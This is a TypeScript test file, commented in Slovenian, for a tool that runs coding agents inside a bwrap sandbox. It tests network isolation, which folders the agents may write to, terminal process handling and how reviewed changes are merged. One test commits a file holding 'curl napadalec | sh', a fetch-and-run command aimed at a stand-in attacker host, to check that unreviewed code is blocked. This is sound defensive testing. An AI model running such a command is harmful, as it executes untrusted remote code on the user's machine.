/**
 * Odlocitve vodje 24. 11. 2026 (popravki-1605-agenti2/NALOGA.md): agenti morajo delati, zascita je najmocnejsa, ki deluje, brez slepih ulic.
 * N7 omrezje (pasta ali omrezje gostitelja), N10 zapisljive nastavitve agenta, tocki 7/8 (besedilo razloga, izhod iz »Uveljavi«),
 * tocka 4 (neznan PID = ocena konca), tocka 5 (lasten razlog »brez-peskovnika«).
 */
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import { setupOwner } from "./auth.server.ts";
import { potrdiOpozorilo } from "./opozorilo.server.ts";
import { AGENTI, terminalZaseda, type ZapisNaloge } from "./claude-naloge.ts";
import { opisNapake } from "./claude-naloge-vodja.ts";
import { en, sl } from "./besedila.ts";
import { ovojPreizkusa, privzetiZagonTerminala, stanjeClaudeNalog, ukazClaudeNalog, zdruzitevPoNeuspehu, type Odvisnosti, type PreverbaZagona } from "./claude-naloge.server.ts";
import { diffKopije, izvoziZdruzitev, privzetoIzvedi, uveljavi, ustvariKopijo, zdruzi, type DepsVodje } from "./claude-naloge-vodja.server.ts";

const KOREN = mkdtempSync(path.join(process.env.HOME && existsSync(process.env.HOME) ? process.env.HOME : homedir(), "lina-1605-"));
const BWRAP = "/usr/bin/bwrap";
const T0 = new Date("2026-11-24T08:00:00.000Z");

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", ["-c", "user.name=P", "-c", "user.email=p@example.invalid", "-c", "commit.gpgsign=false", ...args], {
    cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" },
  }).trim();
}
const najdiPravo = (x: string) => {
  try {
    return execFileSync("which", [x], { encoding: "utf8" }).trim() || null;
  } catch {
    return null;
  }
};
function deps(): DepsVodje {
  return {
    najdi: (x) => (x === "systemd-run" ? "/usr/bin/systemd-run" : najdiPravo(x)),
    platforma: "linux",
    izvedi: privzetoIzvedi,
    izvediPreizkus: async () => ({ koda: 0, izpis: "", potekel: false, napaka: "" }),
    okolje: { PATH: process.env.PATH, HOME: process.env.HOME, GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0" },
  };
}
function repo(ime: string) {
  const osnova = path.join(KOREN, ime);
  const projekt = path.join(osnova, "projekt");
  const podatki = path.join(osnova, "podatki");
  mkdirSync(projekt, { recursive: true });
  mkdirSync(podatki, { recursive: true });
  writeFileSync(path.join(projekt, "a.txt"), "ena\n");
  git(projekt, "init", "-q", "-b", "glavna");
  git(projekt, "add", "-A");
  git(projekt, "commit", "-q", "-m", "zacetek");
  return { osnova, projekt, podatki };
}
async function zdruzeno(ime: string) {
  const r = repo(ime);
  const d = deps();
  const id = "abcdefabcdef0001";
  const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
  writeFileSync(path.join(k.kopija, "a.txt"), "ena\npregledano\n");
  const df = await diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
  const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
  const z = await zdruzi(d, r.podatki, undefined, { id, vodja }, df.pot, [["true"]]);
  assert.equal(z.izid, "ok");
  return { ...r, d, k, z, id };
}

/** Okolje nalog z resnicnim bwrap (ali nadomestkom) in vbrizganimi programi. */
async function okolje(ime: string, programi: Record<string, string>, preveri?: PreverbaZagona) {
  const dom = path.join(KOREN, ime, "dom");
  const podatki = path.join(KOREN, ime, "podatki");
  const projekt = path.join(dom, "projekt");
  mkdirSync(projekt, { recursive: true });
  mkdirSync(podatki, { recursive: true });
  const token = await setupOwner("geslo-test-1234", podatki);
  await potrdiOpozorilo(podatki);
  const klici: { program: string; cwd: string; args: readonly string[] }[] = [];
  const preverbe: { program: string; args: readonly string[] }[] = [];
  const o: Odvisnosti = {
    dom, platforma: "linux", zagonLine: new Date("2026-11-24T07:00:00.000Z"),
    najdi: (x) => programi[x] ?? (["xterm", ...AGENTI].includes(x as never) ? `/usr/bin/${x}` : ["git", "diff", "patch"].includes(x) ? najdiPravo(x) : null),
    preveriZagon: preveri ?? (async (program, args) => (preverbe.push({ program, args }), { koda: 0, izpis: "1.0.0", potekel: false })),
    zazeni: async (program, args, cwd) => (klici.push({ program, cwd, args }), 4_000_000 + klici.length),
    casZagona: () => "1",
  };
  const ukaz = (u: Record<string, unknown>) => ukazClaudeNalog(token, u, podatki, o, T0);
  return { dom, projekt, podatki, klici, preverbe, o, ukaz, token };
}
const zastavice = (a: readonly string[], z: string) => a.flatMap((x, i) => (x === z ? [a[i + 1]!] : []));
function vPeskovniku(args: readonly string[], program: string, ukaz: string[]) {
  const i = args.indexOf(program);
  assert.ok(i > 0, "program agenta je v ukazu");
  const [p, ...a] = [...args.slice(1, i), ...ukaz];
  return spawnSync(p as string, a, { encoding: "utf8", timeout: 20_000 });
}

describe("Tocka 5: preizkusi agy/opencode brez bwrap imajo lasten razlog (SL/EN)", () => {
  it("zdruzi z omejeno=true brez peskovnika -> »brez-peskovnika«, nobenega zagona; besedilo v obeh jezikih", async () => {
    const r = repo("t5");
    const d0 = deps();
    const id = "5555555555555551";
    const k = await ustvariKopijo(d0, r.podatki, id, r.projekt);
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\ndva\n");
    const df = await diffKopije(d0, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
    let zagonov = 0;
    const brez = { ...d0, izvediPreizkus: async () => (zagonov++, { koda: 0, izpis: "", potekel: false, napaka: "" }) };
    const z = await zdruzi(brez, r.podatki, undefined, { id, vodja, omejeno: true }, df.pot, [["npm", "test"]]);
    assert.equal(z.izid, "brez-peskovnika");
    assert.equal(zagonov, 0);
    assert.match(sl.vdRBrezPeskovnika, /peskovnik/i);
    assert.match(en.vdRBrezPeskovnika, /sandbox/i);
  });
});

describe("N10: nastavitve agenta zapisljive (samo njegove mape), resnicni bwrap", () => {
  it("opencode pise v svojo mapo nastavitev (manjkajoco Lina ustvari), v sosednjo in v dom ne", async () => {
    const e = await okolje("n10", { bwrap: BWRAP });
    const nastavitve = path.join(e.dom, ".config", "opencode");
    mkdirSync(nastavitve, { recursive: true });
    mkdirSync(path.join(e.dom, ".config", "drugo"), { recursive: true });
    await e.ukaz({ ukaz: "dodeli", agent: "opencode", mapa: e.projekt, besedilo: "Preglej kodo.", pogoj: "zdaj" });
    const k = e.klici.find((x) => x.cwd === e.projekt)!;
    assert.ok(k, "opencode zagnan");
    const v = vPeskovniku(k.args, "/usr/bin/opencode", ["/bin/sh", "-c", `echo n > '${path.join(nastavitve, "prijava.json")}'`]);
    assert.equal(v.status, 0, v.stderr);
    assert.equal(readFileSync(path.join(nastavitve, "prijava.json"), "utf8"), "n\n");
    // .local/share/opencode ni obstajala: Lina jo ustvari, agent vanjo pise (zgodovina)
    const zg = path.join(e.dom, ".local", "share", "opencode", "zgodovina.txt");
    assert.equal(vPeskovniku(k.args, "/usr/bin/opencode", ["/bin/sh", "-c", `echo z > '${zg}'`]).status, 0);
    assert.ok(existsSync(zg));
    for (const zunaj of [path.join(e.dom, ".config", "drugo", "n.txt"), path.join(e.dom, "g.txt"), path.join(e.dom, ".gemini-x")]) {
      assert.notEqual(vPeskovniku(k.args, "/usr/bin/opencode", ["/bin/sh", "-c", `echo x > '${zunaj}'`]).status, 0, zunaj);
      assert.equal(existsSync(zunaj), false, zunaj);
    }
  });
});

describe("Tocka 4: PID terminala je znan; neznan PID -> rok = ocena konca (A2 ostane zaprt z znanim PID)", () => {
  it("terminal, ki caka na ukaz (gnome-terminal --wait), vrne ziv PID; terminal, ki preda okno in konca z 0, vrne undefined", async () => {
    const mapa = path.join(KOREN, "terminal");
    mkdirSync(mapa, { recursive: true });
    const caka = path.join(mapa, "caka-terminal");
    writeFileSync(caka, '#!/bin/sh\n# kot gnome-terminal --wait --: zazene ukaz in caka nanj\n[ "$1" = "--wait" ] && shift 2\nexec "$@"\n');
    const preda = path.join(mapa, "preda-terminal");
    writeFileSync(preda, "#!/bin/sh\nexit 0\n");
    chmodSync(caka, 0o755);
    chmodSync(preda, 0o755);
    const pid = await privzetiZagonTerminala(caka, ["--wait", "--", "/bin/sleep", "4"], mapa, process.env);
    assert.equal(typeof pid, "number");
    assert.doesNotThrow(() => process.kill(pid as number, 0), "proces terminala zivi");
    process.kill(pid as number);
    assert.equal(await privzetiZagonTerminala(preda, ["--wait", "--", "/bin/true"], mapa, process.env), undefined);
  });

  it("gnome-terminal na tem racunalniku pozna --wait (samo --help-all, brez okna)", { skip: !najdiPravo("gnome-terminal") }, () => {
    const r = spawnSync("gnome-terminal", ["--help-all"], { encoding: "utf8", timeout: 10_000, env: { ...process.env, DISPLAY: "", WAYLAND_DISPLAY: "" } });
    assert.match(`${r.stdout}${r.stderr}`, /--wait/);
  });

  it("neznan PID: zaseda do ocene konca, nato ne; znan ziv PID zaseda tudi po oceni (A2)", () => {
    const z = { stanje: "tece", potrjeno: "2026-11-24T08:00:00.000Z", ocena: { konec: "2026-11-24T08:30:00.000Z", groba: true } } as unknown as ZapisNaloge;
    assert.equal(terminalZaseda(z, false, new Date("2026-11-24T08:29:00Z")), true);
    assert.equal(terminalZaseda(z, false, new Date("2026-11-24T08:31:00Z")), false);
    assert.equal(terminalZaseda({ ...z, pid: 1234 }, true, new Date("2026-11-24T09:59:00Z")), true);
  });
});

describe("N7: omrezje agenta - pasta (loceno) ali omrezje gostitelja z opozorilom", () => {
  it("s pasta: pasta brez preslikave gostitelja in brez posredovanja vrat -> bwrap brez --unshare-net, svoj resolv.conf", async () => {
    const e = await okolje("n7-pasta", { bwrap: BWRAP, pasta: "/usr/bin/pasta" });
    await e.ukaz({ ukaz: "dodeli", agent: "agy", mapa: e.projekt, besedilo: "Preglej kodo.", pogoj: "zdaj" });
    const a = e.klici.find((x) => x.cwd === e.projekt)!.args;
    const ip = a.indexOf("/usr/bin/pasta");
    const ib = a.indexOf(BWRAP);
    assert.ok(ip > 0 && ib > ip, JSON.stringify(a.slice(0, 20)));
    const p = a.slice(ip, ib);
    for (const z of ["--no-map-gw", "--config-net"]) assert.ok(p.includes(z), z);
    for (const z of ["-t", "-u", "-T", "-U"]) assert.equal(zastavice(p, z)[0], "none", z);
    assert.equal(p.at(-1), "--");
    assert.ok(!a.includes("--unshare-net"), "bwrap znotraj pasta ne sme imeti --unshare-net (sicer ni omrezja)");
    assert.ok(zastavice(a, "--ro-bind").some((x) => x.endsWith("resolv.conf")));
    const s = await stanjeClaudeNalog(e.token, e.podatki, e.o, T0);
    assert.equal(s.omrezjeAgentov, "loceno");
  });

  it("brez pasta: omrezje gostitelja (agent doseze ponudnika), stanje »gostitelj« za namig v Nastavitvah; preizkusi ostanejo brez omrezja", async () => {
    const e = await okolje("n7-brez", { bwrap: BWRAP });
    await e.ukaz({ ukaz: "dodeli", agent: "agy", mapa: e.projekt, besedilo: "Preglej kodo.", pogoj: "zdaj" });
    const a = e.klici.find((x) => x.cwd === e.projekt)!.args;
    assert.equal(a[1], BWRAP);
    assert.ok(!a.includes("--unshare-net"));
    assert.ok(!a.some((x) => x.endsWith("pasta")));
    const s = await stanjeClaudeNalog(e.token, e.podatki, e.o, T0);
    assert.equal(s.omrezjeAgentov, "gostitelj");
    assert.match(sl.rcOmrezjePasta, /apt install passt/);
    assert.match(en.rcOmrezjePasta, /apt install passt/);
    const mapa = path.join(e.podatki, "delo", "zdruzitev-abc", "delo");
    mkdirSync(mapa, { recursive: true });
    assert.ok((await ovojPreizkusa(e.podatki, e.o, mapa))!.includes("--unshare-net"));
    // resnicni bwrap brez --unshare-net res tece (agent ni neuporaben)
    const r = vPeskovniku(a, "/usr/bin/agy", ["/bin/sh", "-c", "echo tece"]);
    assert.equal(r.stdout.trim(), "tece", r.stderr);
  });

  it("pasta najden, a ne deluje (preverba pade) -> omrezje gostitelja, agent se vedno dela", async () => {
    const e = await okolje("n7-pokvarjen", { bwrap: BWRAP, pasta: "/usr/bin/pasta" }, async (p) => ({ koda: p === "/usr/bin/pasta" ? 1 : 0, izpis: "1.0.0", potekel: false }));
    await e.ukaz({ ukaz: "dodeli", agent: "agy", mapa: e.projekt, besedilo: "Preglej kodo.", pogoj: "zdaj" });
    const a = e.klici.find((x) => x.cwd === e.projekt)!.args;
    assert.ok(!a.includes("/usr/bin/pasta"));
    assert.equal((await stanjeClaudeNalog(e.token, e.podatki, e.o, T0)).omrezjeAgentov, "gostitelj");
  });

  it("lazen pasta (izvede ukaz za »--«) + resnicni bwrap: argv je izvedljiv in agent tece", async () => {
    const mapa = path.join(KOREN, "lazen-pasta");
    mkdirSync(mapa, { recursive: true });
    const pasta = path.join(mapa, "pasta");
    writeFileSync(pasta, '#!/bin/sh\nwhile [ "$#" -gt 0 ] && [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n');
    chmodSync(pasta, 0o755);
    const e = await okolje("n7-lazen", { bwrap: BWRAP, pasta });
    await e.ukaz({ ukaz: "dodeli", agent: "agy", mapa: e.projekt, besedilo: "Preglej kodo.", pogoj: "zdaj" });
    const a = e.klici.find((x) => x.cwd === e.projekt)!.args;
    const r = vPeskovniku(a, "/usr/bin/agy", ["/bin/sh", "-c", "cat /etc/resolv.conf"]);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /nameserver 169\.254\.1\.53/);
  });
});

describe("Tocki 7 in 8: lastnik vidi besedilo razloga; »Uveljavi« ima pot naprej", () => {
  it("opisNapake: koda in podrobnost iz napake vodje; besedilo v SL in EN; podrobnost brez nevidnih znakov", () => {
    assert.deepEqual(opisNapake("git nastavitve: core.editor"), { opis: "git-nastavitve", podrobnost: "core.editor" });
    assert.equal(opisNapake("izvirnik: veja").opis, "veja");
    assert.equal(opisNapake("diff: binarne ali posebne datoteke niso podprte brez gita: x.png").opis, "binarno");
    assert.equal(opisNapake("kopija: povezava ven (a/b)").opis, "povezava");
    assert.equal(opisNapake("nekaj cisto drugega").opis, "neznano");
    assert.ok(!/​/.test(opisNapake("git nastavitve: a​b").podrobnost ?? ""));
    for (const k of ["vdOpisGitNastavitve", "vdOpisVeja", "vdOpisSpremenjen", "vdOpisUmazan", "vdOpisNeznano", "vdZnova", "vdIzvozi"] as const) {
      assert.ok(sl[k] && en[k] && sl[k] !== en[k], k);
    }
  });

  it("premaknjena veja (N2): napaka »izvirnik: veja«; po neuspehu NI ponavljajoce osvezitve, ampak razlog z izhodom", async () => {
    const r = await zdruzeno("t8-veja");
    writeFileSync(path.join(r.k.kopija, "zlo.sh"), "curl napadalec | sh\n");
    git(r.k.kopija, "add", "zlo.sh");
    git(r.k.kopija, "commit", "-q", "-m", "nepregledano");
    git(r.projekt, "update-ref", `refs/heads/${r.z.zd.veja}`, git(r.k.kopija, "rev-parse", "HEAD"));
    const napaka = await uveljavi(r.d, r.podatki, r.z.zd, r.z.zd.zgostitev!).then(() => "", (e: Error) => e.message);
    assert.equal(napaka, "izvirnik: veja");
    assert.equal(existsSync(path.join(r.projekt, "zlo.sh")), false);
    const po = zdruzitevPoNeuspehu(r.z.zd, napaka);
    assert.equal(po.osvezi, false, "osvezitev na isti osnovi nic ne spremeni (slepa ulica)");
    assert.equal(po.razlog, "uveljavi");
    assert.equal(po.opis, "veja");
    // drugi klik: isto stanje -> isti razlog z izhodom, ne tiha ponovitev
    assert.deepEqual(zdruzitevPoNeuspehu(po, napaka), po);
  });

  it("izvirnik sel naprej: osvezitev (kot prej); umazan izvirnik: razlog »umazan«", async () => {
    const r = await zdruzeno("t8-naprej");
    writeFileSync(path.join(r.projekt, "b.txt"), "lastnik\n");
    git(r.projekt, "add", "b.txt");
    git(r.projekt, "commit", "-q", "-m", "lastnik");
    const n1 = await uveljavi(r.d, r.podatki, r.z.zd, r.z.zd.zgostitev!).then(() => "", (e: Error) => e.message);
    assert.equal(n1, "izvirnik: premaknjen");
    assert.equal(zdruzitevPoNeuspehu(r.z.zd, n1).osvezi, true);
    const r2 = await zdruzeno("t8-umazan");
    writeFileSync(path.join(r2.projekt, "a.txt"), "lastnik ureja\n");
    const n2 = await uveljavi(r2.d, r2.podatki, r2.z.zd, r2.z.zd.zgostitev!).then(() => "", (e: Error) => e.message);
    assert.equal(n2, "izvirnik: umazan");
    assert.equal(zdruzitevPoNeuspehu(r2.z.zd, n2).opis, "umazan");
  });

  it("izvoz kot popravek za rocni pregled: natanko pregledani diff v <podatki>/delo/izvoz, izvirnik nespremenjen", async () => {
    const r = await zdruzeno("t8-izvoz");
    const pot = await izvoziZdruzitev(r.podatki, r.z.zd);
    assert.ok(pot.startsWith(path.join(r.podatki, "delo", "izvoz")));
    assert.equal(readFileSync(pot, "utf8"), readFileSync(r.z.zd.diff!, "utf8"));
    assert.match(readFileSync(pot, "utf8"), /\+pregledano/);
    assert.equal(readFileSync(path.join(r.projekt, "a.txt"), "utf8"), "ena\n");
  });
});
